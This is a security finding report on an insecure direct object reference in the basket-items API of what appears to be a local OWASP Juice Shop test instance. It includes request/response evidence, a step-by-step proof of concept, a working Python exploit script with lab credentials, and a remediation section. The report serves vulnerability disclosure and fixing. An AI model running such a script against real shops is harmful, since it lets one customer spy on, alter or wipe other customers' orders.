# IDOR: Any authenticated user can read, modify, or delete other users' basket items (/api/BasketItems)

**ID:** vuln-0009
**Severity:** MEDIUM
**Found:** 2026-09-11 19:57:45 UTC
**Target:** http://host.docker.internal:3001
**Endpoint:** /api/BasketItems/:id
**Method:** PUT
**CWE:** CWE-639
**CVSS:** 6.3
**Confidence:** High
**Fix Effort:** Low

## Description

The `/api/BasketItems` endpoints let any authenticated customer read, modify, and delete other users' basket items. `GET /api/BasketItems` lists every user's items; `PUT /api/BasketItems/:id` changes the quantity of another user's item; `DELETE /api/BasketItems/:id` removes another user's item from their basket. Only item creation is ownership-checked.

## Evidence

Attacker A (plain customer) against victim B's basket (id 7):

Listing shows all users' items:
```json
GET /api/BasketItems   (as A)
200 OK
{"data":[{"ProductId":1,"BasketId":1,"id":1,...},{"ProductId":4,"BasketId":2,...}, ... all baskets ...]}
```

Update of B's item (id 12, BasketId 7):
```json
PUT /api/BasketItems/12   (as A)  {"quantity": 4, "ProductId": 1, "BasketId": 7}
200 OK {"data":{"ProductId":1,"BasketId":7,"id":12,"quantity":4,...}}
```
Victim's own view `GET /rest/basket/7` (as B) then shows `"quantity": 4`.

Delete of B's item (id 11, then 12, as A): `200 OK {"status":"success","data":{}}` — B's basket empty afterwards (`GET /rest/basket/7` as B → `"Products":[]`).

Controls that DO exist: `POST /api/BasketItems` with foreign BasketId → 401 "Invalid BasketId"; unauth GET → 401.

## Impact

Any customer can (a) surveil all users' shopping activity in real time (products and quantities), (b) silently change what another user's basket contains — quantities they never chose, up to per-product stock limits, directly affecting what the victim pays at checkout — and (c) empty another user's basket, destroying their work-in-progress shopping. Quantity manipulation also lets an attacker push a victim's order toward stock-limit failures.

## Counterevidence

Checked the create path: POST /api/BasketItems with a foreign BasketId is correctly rejected with 401 "Invalid BasketId" — so an ownership control exists and demonstrably runs on creation. Checked whether update/delete failures were stock-related: the 400 responses ("out of stock", "only up to 5 items") came from stock logic, and a within-stock quantity (1→4) succeeded with 200 while the victim's basket showed the new value — the mutation was applied for real. Deletion returned 200 twice and the victim's basket was emptied each time. The controls on create simply do not cover update/destroy or the listing.

## What Would Change This Severity

If quantity manipulation could be shown to alter the victim's charged total at checkout beyond stock limits, or to let the attacker exceed per-user purchase limits at the victim's expense, integrity impact would rise toward High.

## Technical Analysis

`POST /api/BasketItems` validates that the supplied `BasketId` belongs to the authenticated user (401 "Invalid BasketId" otherwise), but the collection listing and the update/destroy handlers operate on bare record IDs with no ownership join to the basket's `UserId`. The result is inconsistent enforcement across handlers of the same resource: create is guarded, while read (listing), update and delete are not. Basket-item IDs are sequential integers, and the unfiltered listing itself hands every item ID to the attacker.

## Proof of Concept

1. Register attacker A and victim B; obtain JWTs and B's basket ID (`bid` from login). 2. As B, add an in-stock product to B's basket. 3. As A, request `GET /api/BasketItems` — B's item is visible with its ID. 4. As A, send `PUT /api/BasketItems/<B's item id>` with `{"quantity": 4, "ProductId": <same>, "BasketId": <B's bid>}`. 5. As B, request `GET /rest/basket/<bid>` — quantity is now 4. 6. As A, send `DELETE /api/BasketItems/<B's item id>`; as B, verify the basket is empty. 7. Confirm create is guarded: `POST /api/BasketItems` with B's BasketId using A's token returns 401.

```python
import requests

BASE = "http://host.docker.internal:3001"
a = requests.post(BASE + "/rest/user/login", json={"email": "tester.recon@juice-sh.op", "password": "recon123456"}).json()["authentication"]["token"]
b = requests.post(BASE + "/rest/user/login", json={"email": "idor.b.jcgpw4pc@juice-sh.op", "password": "IdorTest123!"}).json()["authentication"]
H_A = {"Authorization": "Bearer " + a}
H_B = {"Authorization": "Bearer " + b["token"]}
bid = b["bid"]

requests.post(BASE + "/api/BasketItems", headers=H_B, json={"BasketId": bid, "ProductId": 1, "quantity": 1})

# 1. Attacker lists ALL users' basket items
items = requests.get(BASE + "/api/BasketItems", headers=H_A).json()["data"]
victim_item = next(i for i in items if i["BasketId"] == bid)
print("victim item leaked:", victim_item)

# 2. Attacker changes the victim's quantity 1 -> 4
r = requests.put(f"{BASE}/api/BasketItems/{victim_item['id']}", headers=H_A,
                 json={"quantity": 4, "ProductId": victim_item["ProductId"], "BasketId": bid})
print("PUT:", r.status_code, "quantity now:", r.json()["data"]["quantity"])  # -> 200, 4
print("victim sees:", requests.get(f"{BASE}/rest/basket/{bid}", headers=H_B).json()["data"]["Products"][0]["BasketItem"]["quantity"])  # -> 4

# 3. Attacker deletes the victim's item
print("DELETE:", requests.delete(f"{BASE}/api/BasketItems/{victim_item['id']}", headers=H_A).status_code)  # -> 200
print("victim basket:", requests.get(f"{BASE}/rest/basket/{bid}", headers=H_B).json()["data"]["Products"])  # -> []

# 4. Create IS guarded (shows the missing checks are on read/update/delete)
print("POST foreign:", requests.post(BASE + "/api/BasketItems", headers=H_A, json={"BasketId": bid, "ProductId": 1, "quantity": 1}).text)  # -> 401 Invalid BasketId
```

## Remediation

Extend the ownership validation already present on item creation to the other handlers: filter `GET /api/BasketItems` by the caller's basket ID, and before `PUT`/`DELETE /api/BasketItems/:id`, resolve the item joined with its basket and verify the basket's `UserId` equals the token user's ID, returning 403 on mismatch. Derive the caller's basket from the token rather than trusting client-supplied `BasketId`/item IDs.

## Assumptions

Assumes the attacker holds any valid customer JWT (free self-registration) and knows a victim basket-item ID; IDs are small sequential integers discoverable via the same unfiltered listing. Demo data; production would expose real customers' purchase activity.
